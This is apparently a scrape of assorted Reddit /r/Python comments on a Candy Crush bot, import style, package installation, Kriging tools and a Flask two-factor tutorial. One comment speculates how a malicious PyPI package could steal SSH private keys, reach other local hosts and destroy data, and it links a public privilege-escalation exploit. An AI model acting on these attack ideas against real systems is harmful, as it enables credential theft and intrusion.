Pretty cool. I like that you mention a couple areas for improvement (algorithm for move scoring). I haven't looked at the code for which greedy algorithm you're doing, but it might also be interesting to then create a feature set from the outcomes of this bot playing candycrush, a whole bunch of times, and then training another bot on the set to see if that bot is more efficient or not. Anyways, pretty cool!
It wouldn't stop the script from uploading your private keys to the server, if they are in memory (probably not an easy task, but definitely not impossible). If that's too difficult, it could always upload the private key files, hoping for an unencrypted set. If you get enough targets, the likelihood of trapping a lazy admin like me increases. There is also the consideration of disruption and destruction, the ability to possibly access other hosts on the local network, etc. If you can do it by typing commands, so can the script. EDIT: this makes me feel better "Since the 12 of Augoust 2002, setgid(2) and setegid(2) calls have been added to the ssh-agent source code in order to prevent the process memory to be read by any non-root user: URL:http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.99&amp;r2=1.98&amp;f=h " from: http://c0decstuff.blogspot.com/2011/01/in-memory-extraction-of-ssl-private.html But then again, with enough targets, there may be a host that has this vulnerability: https://github.com/realtalk/cve-2013-2094 
I haven't read the source code since I certainly don't have the skill level for it, but instead of taking a picture of every square and then running an identifying algorithm, couldn't you just read a single pixel from every square instead? The candies look to be different enough that it shouldn't be a problem to find a point on the candygrid where all the candies are different.
Yea, and that's actually who is behind ting mobile. In case you care
Hi, Well the algorithm basically works like this. I try out every possible move on the board and score it by trying to simulate what the game does (candies falling, etc). This is an aproximative score since i did not reverse engineer the way that candy crush scores your moves. So basically 4 candies will be better than 3, etc. From this it keeps track of the highest scoring move. Then it proceeds to do that move. This is why I call it greedy, because it doesn't look into the future (depth) at all. An improvement would be to try an see what set of moves would be optimal. This would be a sort of a depth first search that will allow us to plan 2-3 moves ahead. Eg. I do a low-scoring move now, but my next move will be super-high scoring. This can of course be canceled due to new candies falling and revealing newer possibilities. Hope all is clear :).
I guess running a search engine is pretty cheap?
The problem with a single pixel would be telling striped candies from non striped candies. If the scoring algorithm takes into account a weighting metric for striped candies, it would need to differentiate between them. That said, you could probably get away with a very small area classification (but I'm not sure it would improve performance in a meaningful way except in the training time of the classifier).
I did it exactly like that the first time, but this starts to fail and it gets complicated to identify relevant features (pixel groups ) for candies with stripes for example. You can have each candy color with horizontal stripes and vertical stripes. This is why I chose to use a classifier for the task in the end.
Again:it's longer and it's outright wrong (behavior is different from the original) It'll be much worse by the time it matches the original. Even if it were correct, it's still WORSE. Think about in in terms of execution paths (aka spaghetti). Your code definitely has more and longer execution paths than the original: as execution paths weave in and out of the if statements. Original cuts them short, yours does not. 
Thanks that's very helpful.
Well it plays almost like an average human. It reaches about 40000-50000 on average, it;s max score is around 90000 i believe. It's biggest problem is that it's slow because it waits for the board to settle between moves. So that could be an area of improvement.
Nice idea. Tho there's something weird going on, my rss reader caught up updates for lxml and requests while the feed was only for django and celery (http://farmhouse.b2ck.com/atom?packages=celery&amp;packages=django)
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Minimax**](https://en.wikipedia.org/wiki/Minimax): [](#sfw) --- &gt; &gt;__Minimax__ (sometimes __MinMax__ or __MM__ ) is a decision rule used in [decision theory](https://en.wikipedia.org/wiki/Decision_theory), [game theory](https://en.wikipedia.org/wiki/Game_theory), [statistics](https://en.wikipedia.org/wiki/Statistics) and [philosophy](https://en.wikipedia.org/wiki/Philosophy) for *mini*mizing the possible [loss](https://en.wikipedia.org/wiki/Loss_function) for a worst case (*max*imum loss) scenario. Originally formulated for two-player [zero-sum](https://en.wikipedia.org/wiki/Zero-sum) [game theory](https://en.wikipedia.org/wiki/Game_theory), covering both the cases where players take alternate moves and those where they make simultaneous moves, it has also been extended to more complex games and to general decision making in the presence of uncertainty. &gt;==== &gt;[**Image**](https://i.imgur.com/WfoVO4p.png) [^(i)](https://commons.wikimedia.org/wiki/File:Minimax.svg) --- ^Interesting: [^DR-DOS](https://en.wikipedia.org/wiki/DR-DOS) ^| [^Minimax ^\(TV ^channel)](https://en.wikipedia.org/wiki/Minimax_\(TV_channel\)) ^| [^Minimax ^Condorcet](https://en.wikipedia.org/wiki/Minimax_Condorcet) ^| [^Courant ^minimax ^principle](https://en.wikipedia.org/wiki/Courant_minimax_principle) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cotpejm) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cotpejm)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
cool bot
That is actually a good sugestion. I will update it soon. Last time I worked on it I was trying to make it so it would be easier to run on other computers, without the need to manually specify the game board position. I'll include this in there too.
I prefer a dictionary, like `board_dict` in main.py
thinking about it one second more, minimax wouldnt make sense because you are playing **by yourself**. I guess, what I was wondering was if you tried looking a few moves in advance, or just how much point the present move was going to produce. (edit in bold... reread my text, it looked like I had a stroke.)
Wow that's really cool OP, great work!
Hi How do you actually interact with the game? I mean, I get that to read the candy position to take screenshots. But to make the moves, how do you do it?
Really cool! I didn't know you could send mouse clicks / drags to a browser window.
Does it give a slightly higher rate to matches at the bottom of the board? This give a higher chance of a combo of matches. At least that is how I played it manually back-in-the-day 
I have done something similar when composing multiple XML files based on tabular data that I receive. Essentially I create a string template and within that string I will have areas that will be updated with values within the tabular data that is read into the script line by line. For example I may have field in the XML that variable and within the string I use "%service_%report_date". As the data is read in I will replace the "%service_%" with the actual service id number using string replace. Not sure if this is what you are looking for but you can write your PHP as a docstring and then call and replace/update accordingly and then write out the updated string to file.
The packages weren't clobbering existing trusted packages. They were new packages with spelling similar to existing trusted packages. The malicious packages could be signed by the author just as well, and no automated system would pick up on it, unless you also had some sort of a web-of-trust in place. 
But do not import everything from the file like that. Either import the constants or use the module namespace. 
I agree with you. And it would make the dict version even worse. That said, importing everything like that does has its place, when you want to avoid extra lookups (speed). Do it with the module namespace first, then optimize later.
Yes, in a way. It evaluates the board starting from the top row and moving down. If it finds a move with a score **equal** or higher to the previous maximum score, it will switch to the new move. This means that: three candies on the bottom row will be picked instead of 3 candies on the top row (or any row evaluated before that), but 4 candies in the top row will get picked even if on the bottom row we have a move resulting in 3 candies being destroyed.
Yeah i know :), but at the time of writing I didn't find a module that works on all platforms and does that, but I'm sure that there is a simple linux alternative to that. The good thing is that it's probably the only platform specific code
You're not secretly my mother who has taken up coding, are you? Standard remote technical support question #2: "And when you say it gives you an error. Can you tell me what the error says?"
That's what I'm looking for. I was wondering if it was already available or if I should just write it from scratch. I did find some CRUD tools to simplify the php code, but it looks like I have to write the python on my own. I just didn't want to reinvent the wheel.
Cool.
Thanks so much for your answer! I'm not using it for academic excises, I am thinking to use it for production. Do you advise that I use classical way Class Worker and Class Consumer, and affect tasks directly without using threading. 
What is the editor you are using? Is it some IDE or just an editor?
You don't need to Operation = n1+n2 yoibt = 'your operation is being taken'; You can just: print("your operation is being taken") print(n1 + m2) 
I found and fix the issue. Of course it was a cache invalidation one :-)
Django is with upper case D
Perhaps it is. I have not used it.
Awesome! I did something very similar last year to make an evolving QWOP bot. Same pitfalls apply :) https://github.com/5outh/autoqwop 
You should direct questions related to learning the language to /r/learnpython. Also, you can format the code for readability by indenting each line four spaces when posting to reddit like this.
You made me laugh sir! 
This is so cool! I'm just in the middle of trying to do something quite similar with screenshots and image detection from a game myself, so this brings hope:)
Very cool project! You might be interested in this paper: [Candy Crush is NP-Hard](http://arxiv.org/abs/1403.1911).
edit: couldn't fully wait so I shared it on the /r/compsci [thread!](http://www.reddit.com/r/compsci/comments/2wofw7/hi_two_months_ago_i_posted_a_simple_algorithm/cotyzz6) :D This is awesome man! I'm glad that the resources were useful! Mind if I share this as a success story? I'll link your work in the README and on my [twitter](http://twitter.com/rodricios) account. Really, the fact that it was helpful to you makes me happy lol. 
&gt; Yhat's port of ggplot becomes production-ready +1 to that. Some bugs to iron still.
Some sort of "social experiment", I'm sure.
Hah, yeah I'm ok with that.
Ah, great! Cookiecutter is pretty good though it's not an official source. I'd recommend starting with the pypa example project (official) and just asking the pieces you want (Travis, docs, etc...). You could even take that and make it a Cookiecutter project. Best of luck! 
Thank you.
&gt; This can of course be canceled due to new candies falling and revealing newer possibilities. If you can learn the distribution of new candies falling from the top, then you can run a Monte-Carlo simulation of dropping candies and future moves and choose the moves with the highest expected score (integrated over the Monte-Carlo samples).
By single player, I really meant single agent/without an opponent. Of course, you can use minimax for a computer opponent.
Please tell me there's a video for this..! 
however here my understanding is that the candies are placed at random at the top, and that you need to do something like a probabilistic combinatorial optimization
Ah. Well I was thinking the random placement could be viewed as a "computer enemy", even though it's technically single player. It'd be you vs the game, instead of you vs an explicit player.
Why? If everything in `candy_constants` is the constants...? 
I'm not sure what technique you are using or considering for game window recognition but you are welcome to use anything in the puzzle quest utility i made. https://github.com/kobejohn/PQHelper/ 
Seaborn is great for exploratory analysis. Python blaze and dask both have no R parallel for a consistent array and chunking interface to a variety of backends. Pretty innovative if you ask me. Super easy to create and app with blaze and bokeh. 
I don't know if R has anything for Bayesian stuff as extensible as Pymc, and you have numba for jitting a subset of numpy code to near c speeds.
Yeah, once you get into speed, massive data, etc. the game changes. 
I never thought libVLC had a python interface. Thanks for pointing out. But I think imageio pointed below fits my needs well.
That's a good way of doing it. The way I prefer is to fake an enum (since I usually work with 2.7) with a class, that allows the colors to be cleanly namespaced as well. I prefer CandyColor.BLUE to candy_constants.BLUE or naming my module CandyColor.py, which PEP8 is against. class CandyColor(object): ( BLUE, GREEN, ORANGE, ) = range(3) candy1.color = CandyColor.BLUE Sometimes I'll set them to strings like `BLUE = 'blue'`, only when the string needs to get used in a lot of places, with an API or something else I'm going to work with that depends on these constant string values... Personally, I avoid designing anything that depends on constant string values (eg. code dependent on sql string column being one of 'red'/'green'/'blue'), but I do run into it a lot.
I don't know, it really just seems like you're blindly following convention. You argue against using all-import in general, which I can definitely agree with, but not really in this particular case. Not much confusion (probably just flat-out none at all) would spring from importing everything from a module with a name as clear as `candy_constants`. Sure, convention and "best practices" exist for a reason, but they can and should also be broken by people who know what they're doing. `from candy_constants import *` can definitely be seen as way more clear and concise than something along the lines of `from candy_constants import BLUE, GREEN, ORANGE, PURPLE, RED, YELLOW, CHOCOLATE`, and also carries the perk that new constants don't require changes in two places. 
I opened up chrome's dev tools to look around and see if there were individual html elements that could be targeted but my computer didn't agree with this and began to melt. Maybe someone else has other ideas. 
Then I'd say that's a personal problem for you that you can't see it without looking every time, and not a problem with the code. Of course you're not going to assign any weird module-level variables in `candy_constants` - that'd be the real problem.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Of course *I'm* not going to, but none of this applies if I'm the only one working with the code that I wrote. I'm not going to forget what's in candy_constants.py if I wrote it, but if I'm collaborating with a good number of people, I try not to use any wildcard imports just so they know exactly what I meant to bring in the namespace. Personally, in this specific example, I'd do: from candy_whatever import CandyColor if candy.color == CandyColor.RED: ... You get the same exact benefit of being able to add or change constants, and you are explicit about what you're pulling in. Plus, other types of constants might be in there, and they're namespaced into their type of constant. There's a million ways to do the same thing, and I tend to go for the unambiguous version. This isn't an argument whether my way or your way is the best, it's an argument for why people might not use a wildcard import like you're suggesting. It's in the official style guide for god sakes. You don't need much more reason than that.
I agree that this is an absolute no go. Also the author does not mention ``__del__`` anymore but in the code? 
When i insert the value this happens: Insert the first value: 6(the problem is here)Insert The second value: After i insert the number the next input apears right in front of that number, it doesnt change the line
I don't know anything about static code analyzers, so sure, that could be a completely valid concern. I figure any analyzer worth its salt should check across files, though...?
This made my morning! :D
&gt; Hey! Is it worth learning python? What are the advantages and disadvantages of learning it? And what kinds of Books do you recommend that is good for Python beginners? Thank you! :') Thank you! 
There is a security breach in the exemple, it store the secret (field otp_secret) in the same SQL table that the hashed password. It is harmful because if someone can steal the password via sql injection, it can also steal the otp secret. The otp protection become useless. 
That didn't work either.
Can I use it at Facebook?
How did you get the dark skin set up? And can it use readline hotkeys? Ctrl-a to start of line, ctrl-k to cut line, etc.
You can choose the skin when you start pycharm the first time. It can be later changed from the options too ( their options menu has a useful search function that you can use to find it). It's called Dracula I believe. As for shortcuts, the editor is quite powerful, but I don't really know if it supports readline hotkeys, but I suspect that you can configure it to have them
Static code analyzers are by definition *static*, which means they can detect problems in your code *without running it*. They could check other files but in Python you can hijack the import system and use `import` on files which don’t exist, using an import path defined at runtime, etc. The analyzer has no way to know which file you’re *really* importing.
It's not complete till it spams all your Facebook friends.
The package seems to be removed by PyPi team. See edit on first comment.
what is the error you are getting ?
I wouldn't call this a security breach, because for this to be a issue it would need a SQL Injection Vulnerability in the system. If you have a SQL Injection Vulnerability somewhere then moving the otp_secret into a different table wouldn't really help to secure it against SQL Injection. The attacker would (probably; depending on the SQL Injections possible) be able to find information about the Database Schema and read (maybe even write to) anything on the database.
Over the years I've learned - through various bugs and problems and headaches - that import * should really be avoided. If you don't like explicit import of every constant, then import the module with it's own namespace. import candy_constants as cc cc.BLUE is almost as easy to type, is still pretty clear, and will let you easily find every reference to colors in the code. As a bonus, it will also make the job of code checkers a whole lot easier. *"from module import *"* code is something i only do if I am making something quick that will only run once, and even then I usually prefer not to do it. It makes things messy.
Unfortunately I never made one :( You can pretty easily run it locally though on a Windows machine by downloading [anaconda](https://store.continuum.io/cshop/anaconda/) and figuring out the coordinates of the top-left corner of a QWOP window. It takes a little while to find a good player, but after a few hours the game will almost win, haha. The algorithm is based on [this google research paper](http://research.google.com/pubs/pub42902.html).
Thanks!
The sidebar also has a series of links to online books about getting started with python. So, the correct answer is "in the sidebar".
Sure. You could do this. You could also move the Password behind a Service for validation. I have build something similar for clients before, but calling this a Security Breach because there might be other unrelated Security Problems seams far fetched. Just as I would not call this Service Separation insecure because someone could theoretical gain Access to that Database if you don't patch the Server OS. The Important thing here is that it is Demonstrating how to implement a 2FA in a short and understandable matter. Moving the OTP Secret to a different Table or Database would only complicate the Example. Also: If you want to argue possible security concerns of example Code, why not criticize his Use of HTTP instead of HTTPS to share the OTP Secret between User and Server? It is about as useful a criticism if you ask me.
For usability's sake, I think it would be good to change this. Searching warehouse for [`flake8_import_order`](https://warehouse.python.org/search/project/?q=flake8_import_order) returns no results, whereas [`flake8-import-order`](https://warehouse.python.org/search/project/?q=flake8-import-order) succeeds. Many python projects use hyphens in their name instead of underscores.
Instead of importing all of the constants, you can import the namespace as an abbreviation and use that instead, i.e. `import candy_constants as cc` and then use `cc.BLUE` to access specific constants. The reason for this may not be obvious, but there are non-obvious side effects from using the wildcard import and they can be difficult to debug. In some cases wild card imports are actually the standard practice and one such instance is in Django settings file, which I actually do use. This is a separate case from that though and in general the wild card import should be avoided if only to prevent confusion for people that will read your code.
Look at this example: candy_constants.py BLUE = 4 GREEN = 0 main.py from candy_constants import * BLUE = 2 print(BLUE) This will return 2. This may be what you want in a specific case, but it has overwritten the defaults you made in the file specifically for containing the defaults. In this example it is clear where the bug is, but in larger code it is not so obvious, whereas if the constants were imported with a name space like so import candy_constants as cc BLUE = 2 print(BLUE) print(cc.BLUE) you can access both, i.e. this would return 2 and 4. 
Anaconda is made on top of **Jedi**.
For the package, `Gtk.&lt;tab&gt;`.
OTP is inherently symmetric. You can at most hide the OTP key behind reversible encryption to deal with offline database breaches.
&gt; file &lt;"stdyn"&gt;, line 1 &gt; pip install tweepy Are you running it in a script ? if so you need to change pip install tweepy to pip.main(['install','tweepy']) or just run on the command line pip install tweepy 
on a mac/linux open a terminal and type the command. In windows (I am not a windows user so this could be wrong), open a command prompt and type the command. pip install tweepy Just like you are running a python file from the command prompt. 
You should really consider switching to 3.x (where x &gt;= 3). It has many such nice additions that make using it much more pleasant.
I have a feeling you did it in the python shell ;)
Or use [requests](http://docs.python-requests.org/en/latest/) for a much nicer API: First example: import requests config = { 'api': 'https://api.pushover.net/1/messages.json', 'user': 'user_key', 'token': 'your_token' } def send_message(title='', msg=''): data = { 'user': config['user'], 'token': config['token'], 'title': title, 'message': msg } response = requests.post(config['api'], data=data) if response.status_code != 200 print "Fail" return False if response.json()['status'] == 1: print "Success" return True print "Remote fail" return False 
Oh. Well then. I'm stupid. At least I have Tweepy now. Time to find a tutorial for a twitter bot!
You could start by checking out: http://pythonprogramming.net/
Try to add some explanation text, or have a better, more descriptive title. That said, NLTK is a very well established module. I am sure plenty of people haven't seen or heard of it, but definitely not a new or novel module to share here. NLTK is actually the reason why I learned Python. Fantastic module, and they wrote, and share for free, their own book for how to use it. Worked for me to learn Python too. Definitely a great module if you're interested in NLP.
Point taken. I do mention that it is necessary to use HTTPS (Search for "Always use secure HTTP to transmit forms that contain passwords"), but should have made it more clear, and also should have provided a link to the https URL for the Heroku hosted example. I will address both.
Well hot diggity: http://pythonprogramming.net/twitter-api-streaming-tweets-python-tutorial/?completed=/mysql-live-database-example-streaming-data/ Not sure Tweepy is the ideal resource for a twitter posting bot, but it has been a while since I poked around the module. 
It was not actually making a point about it. The Article was fine in my Opinion. I just tried say that having the OTP Secret in the Same Table as the Password does not sound like a Security Breach to me and that arguing over Security in Example code seams kind of useless anyway. Well... I tried to say at least. English is not my first language and I apologize if me being not clear made unnecessary work for you. P.S. Your Flask Book is very nice. I enjoyed reading it. Thank you for writing it.
I find it the most useful for data analysis or any sort of ad-hoc job I need done quick. It can do almost anything though! Great for rapid prototyping! 
Programming
Nice work! I made a bot for [10,000,000](http://store.steampowered.com/app/227580/), another match-3 game, about a year ago using Java, though it didn't attempt to look for the "best" matches to make. It just made the first one it found. It worked so fast though that making lots of non-optimal matches still worked just fine.
It is fixed now.
If you don't mind me asking, what kinds of data analysis do you do with Python? I've heard talk of it's capability in this area, but I'm wondering what kind of projects it's used in?
I think you might not have experience following the conventions since you might not have experienced a situation in which this results in a catastrophic failure or worked together on a large project where this convention is needed. This convention was created for the reasons outlined above as it creates clear, readable code. from candy_constants import * from candy_constants_2 import * print(BLUE) if `BLUE` was defined in both files it would use the one imported from `candy_constants_2`. This is not the behavior you want.
No, don't get me wrong, I definitely see how it's bad practice in many cases. It can definitely lead to some unexpected behavior. You seem to be missing my point, though - that it's so astronomically unlikely to cause any trouble in *this particular case* that the downsides outweigh the upsides.
any chance you can download the selenium packaged and try to manually install?
Not sure this is what I would say is the most significant change with Python 3, but still a good one. Didn't notice this as a change, though I tend to prefer to write py2/py3 compatible code. 
I tried that as well, downloaded the latest version, unpacked it into the python directory(working on windows here) and running python setup.py install did nothing. Not sure if the package needs to be in the python folder or in a subfolder with setup.py. Tried it in both locations. 
I cant remember if it had some other requirements off the top of my head. Every install ive ever done was on linux for selenium grid type things.
I skimmed this, and don't understand how this has anything to do with a Raspberry Pi. It seems like generic instructions for any Debian-based Linux distro, regardless of hardware.
These install install instructions should work on most Debian-based Linux distros. Raspbian/NOOBS, which is the OS the Raspberry Pi is normally shipped with, is Debian-based at the core. It's also important to update the Raspberry Pi firmware before trying to install OpenCV and connect a camera. I also included the install times for the Raspberry Pi to as pointers to when you should grab a cup of coffee vs. go for a long walk vs. go to bed and deal with it in the morning.
Yes, it is compatible with Python 2.7. The beta (which can be built with cmake) does support Python 3 (although I think you're right in saying that some bindings are missing).
according to the stickied post at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/ 
Thanks!
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck! ____ It's definitely worth learning. ;)
It does. I was going to point out that the Pi camera takes some special configuration (it's not a standard autodetecting usb web-cam, it uses some gpio pins), but nothing specific to that in the guide. However, it is a nice and easy guide to follow.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Ha! and i thought I was the only one
I always thought the most significant change was that print is now a function and that we now have to add parenthesis.
That's just nasty though.
Pygame runs in 3.4. [This](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame) works, iirc when I tried using their bitbucket version it didn't
Just a question here: couldn't you install that inside a docker container and ship the container?
the convention is to use cls as first parameter for classmethods
I worked so much harder on the bot than the game that i never actually finished the game. Your enthusiasm makes me want to go back and finish it. 
Python encourages overwriting buildins when that makes sense. No need to name your var something weird like "my_license" when you can just overwrite license.
Yeah I'll be honest when I switched from writing 2 to 3, this is what messed me up the most in the beginning.
nginx[0] [0]http://nginx.com
I recommend [requests](http://docs.python-requests.org/en/latest/) and [beautifulsoup](http://www.crummy.com/software/BeautifulSoup/) Scrapy is okay, but the parser doesn't handle shoddy HTML and lazy developers as well as beautifulsoup does. Fetching web pages with requests is dreamy easy. Be warned, amazon may use some ajax-type activity to produce all of the information on the page. You might find it useful to use the chrome dev tools, or to install firebug in firefox, so you see exactly how the page works.
Mechanize is, by far, the best library out there for bot-automation. http://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet 
Doesn't work Traceback trying to import after pip install in a fresh virtualenv. from pkg_resources import parse_version, SetuptoolsVersion, iter_entry_points ImportError: cannot import name SetuptoolsVersion
[relevant](http://stackoverflow.com/questions/3423447/which-actor-model-library-framework-for-python-and-erlang-like)
http://i.imgur.com/AvJ6iLu.jpg
seems like your setuptools is too old and i forgot to depend on a recent enough version, thanks for finding and reporting
Python code running as fast as C! Cool stuff. I'm actually more excited about the Pypy-friendly version of Matplotlib they mentioned in the beginning. I can't wait to see how Pypy will stack up against Julia once both of them mature.
Should mention the name of the non-profit!
You might check out [blender](http://www.blender.org). It has a built-in python interpreter and people use it for a wide variety of purposes. MeshLab is also great for viewing point clouds as it has a some nice GLSL shaders included.
Paraview may also be useful. It's designed for showing large 3D datasets and has python support.
Well it's not like a charity and pretty niche but if anyone lives in Sydney, Australia or plans to visit and enjoys live music I run [The Lyceum Gig Guide](http://thelyceum.com.au/). I try and promote the local scene for independent artists since there isn't really any good gig guides for the region. I'll add it to the description :)
I usually just add a trailing underscore. `with open("...") as file_:`
http://gr-framework.org/ sounds like what you are looking for. It was developed for this purpose and with speed in mind. If I remember correctly it has a matplotlib-like syntax implemented by now, so it's easy to use.
Yes because i think that i will customize it, so i prefer it to be written in python. What's the difference beetween asking for a lib to do something in python ?
I've messaged you!
The angular,bootstrap, mysql part doesn't matter. I use uwsgi. You can run with 1 line-config to configuring everything.
according to the stickied post at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/ 
Where do you want to display it? If a browser is an option, `D3` could be worth a look - create JSON-formated data in python, push it (i.e. websockets) to you website, enjoy awesomeness like [these](https://github.com/mbostock/d3/wiki/Gallery).
When Raspbian will be based on Debian GNU/Linux Jessie you can follow this tutorial: [Install OpenCV on Ubuntu or Debian] (http://milq.github.io/install-opencv-ubuntu-debian). You can use not only Python 2 but also Python 3.
This is probably within the domain of [vispy](http://vispy.org/), though I haven't tried this kind of thing.
The documentation is available at http://pytest-flask.readthedocs.org/en/latest/. Any help and criticism are welcome.
#####&amp;#009; ######&amp;#009; ######&amp;#009; ####&amp;#009; **Engineering Design via Surrogate Modelling: A Practical Guide** Current $96.48 High $114.10 Low $96.48 [Price History Chart and Sales Rank](http://i.imgur.com/rIPFBkR.png) | [GIF](http://i.imgur.com/udhwWTP.gif) | [FAQ](http://www.reddit.com/r/PriceZombie/wiki/index) 
I think [AutoHotKey](http://www.autohotkey.com/) would be better suited for this kind of problem.
Are you familiar with GPy? 
I've done some experimentation with Kriging in the past, I'll definitely give this a try. Thanks for sharing!
For me: * Exception chaining * Stdlib modules: enum, pathlib, ipaddress, venv * PEP 442 - Safe object finalization * yield from 
No prob! I ran it on an Ubuntu 14.04 VM so that would probably affect a lot of people :)
Thanks for the kind words! I am really glad you liked it. All my posts are currently on that same blog and I will make sure to post any new python ones on here.
I'm probably going to use this solely for the convenience of your [monkey-patched response class](https://github.com/vitalk/pytest-flask/blob/09c3f691656431f457666efbc86f72dcb004e5fc/pytest_flask/plugin.py#L45): r = client.get(url) # Annoying: data = json.loads(r.get_data()) # Awesome: data = r.json I'm not sure about the usefulness of the [Content Negotiation fixtures](http://pytest-flask.readthedocs.org/en/latest/features.html#content-negotiation). I'd rather define them in a module somewhere and import them rather than add additional parameters to my test functions: from pytest_flask.fixtures import accept_json def test_something(): r = client.get('/', headers=accept_json) Versus: def test_something(accept_json): r = client.get('/', headers=accept_json) The main reason to use pytest fixtures that I see is the ability to control the scope of the data generated by the fixture. You can make a `db` fixture to drop all data from the database between tests if you wish. The content negotiaion fixtures don't do anything dynamic or requiring scope, so the benefit of fixtures is lost on them.
yeah right but i tried that and it doesn't works also it won't give me the programming capabilities that i need to develop the program
I finally got it installed. did a complete uninstall/reinstall of python, then started digging around in the folders. The manual install instructions never tell you WHERE to unpack the archive. If that snippet of information had been included (in the \python34\Lib\site-packages folder), I would have been done. Still have no idea why easy_install or pip either one generated errors trying to install selenium from pypi.python.org. But on this page (https://pypi.python.org/pypi/selenium/2.44.0) the big green button at the top of the page gave me a random server error when using it. Using the link in the middle of the page worked fine. 
&gt; The content negotiation fixtures don't do anything dynamic Yes, looks like I missed this part, because I'm usually parametrize them as well @pytest.fixture(params=['application/json', 'application/javascript']) def accept_json(request): return [('Accept', request.param)] Thank you for pointing this. 
Interesting idea, using a context manager to manage a background process. I'm honestly really not a fan of the `print` in the `__exit__`, though. Helper classes like this should really be as side-effect minimal as possible.
&gt; Where does the params value passed to pytest.fixture go? I see request.param &gt; but params isnt referenced anywhere... &gt; Also, where is the request fixture coming from? I was unable to find it &gt; anywhere. `request` is a [pytest built-in](http://pytest.org/latest/builtin.html#fixtures-and-requests) and available to use in others fixtures. See official [pytest documentation](http://pytest.org/latest/example/parametrize.html) about parametrizing tests. &gt; The accept_jsonp fixture is not parametrized, is it supposed to be? The same as `accept_json` fixture, it can be parametrized easily. But typical tests don't need that, so I don't parametrize them by default to ensure the test suite not slowed. 
Hi. Your work is great but I felt little uncomfortable in using with `boto`. At first, our project used DynamoDB only with boto, and realized that we need to define schema. So we found some libraries and chose PynamoDB. However we soon found that PynamoDB works differently with boto (I can't correctly remember but I assume that it was about saving `set` in different format) and does not support all the DynamoDB types and functions. I could not guess how hard it would be to make things work with both boto and PynamoDB. The core idea of BynamoDB is just wrapping the low level interface of boto as a high level interface. It's hard to use DynamoDB only with boto, but the low level interface of it supports all the functions (and types also recently, since boto-2.32.2). So I thought it would be great to make a new high level interface and use both. Your work is great and the code is really good. I checked the license of your work and used some part of it. Thanks for you work.
Killer. Thanks again.
Even 100x100 is too small, you're talking about a very fast operation for modern processors. 10,000x10,000 or something.
Very cool - interesting to see how another discipline approaches kriging/Gaussian processes! If/when you go to implement cokriging you might want to take a look at the intrinsic colocated cokriging formulation as one option - it is much easier to work with compared to regular cokriging. This is especially true when you are modeling 20+ variables. Quick question: I couldn't find any search options. Are you using all available data for all estimates? Have you tested how this scales and run in to any problems?
Cool, thanks for the suggestion on Co-Krige stuff. Do you have any good literature references? I haven't done too much stress testing. I did train a 3D model with ~350 points. It took a while, but my macbook pro didn't have any issues. I haven't tried the optimizer with many dimensions. It may be necessary to tweak things there to make it work. The usual considerations apply: if you want to train really big models, you need lots of time and memory. What do you mean by 'search options'? Is that hyperparameter search options or trained model searches? 
Gotta agree with this!
This all sounds unnecessarily complex, to be honest. Why would you need an object, an SQL database, and files to spread the enemy information?? You know, these questions, where a person already has some pre-conceived notion of how to build their system and they want help on "just a small detail" are often the most difficult to answer. It would be much easier if you described the general idea of what you're trying to accomplish. Then people may be able to point you in the right direction.
I see a fairly easy path to two level Co-Kriging (e.g. one cheap dataset and one expensive dataset). I think I could have that coded up in a week. I also want to implement Regression Kriging, which is really a minor change to the current Kriging class. 
Description would be nice... &gt; Simple real-time messaging in web applications. Thanks!
...
a new release is out declaring the dependency
Thanks, resubmitted with description in title
Could someone put this into plain English for Python users? Is there anything to be concerned about or do?
Well I learned something new today. You use these models in a much different way than I use them. Does the neighborhood selection change during Kriging training? Could you not have a pre-processing step that down selects a space-filling collection of points that is then used for Kriging? You might even be able to 'infill' with existing points from your initial dataset. I'll share my 'typical use case' for this library for reference. I use Kriging to explore design spaces (usually between 3-5 independent variables). Each data point in the model comes at a significant cost, something like 60 wall clock hours of simulation on 128 cores of a cluster. Minimizing the number of data points needed to understand the topology of the design space is very useful. This is also why the infill tools are build into pyKriging. I'll checkout Chiles and Definer! 
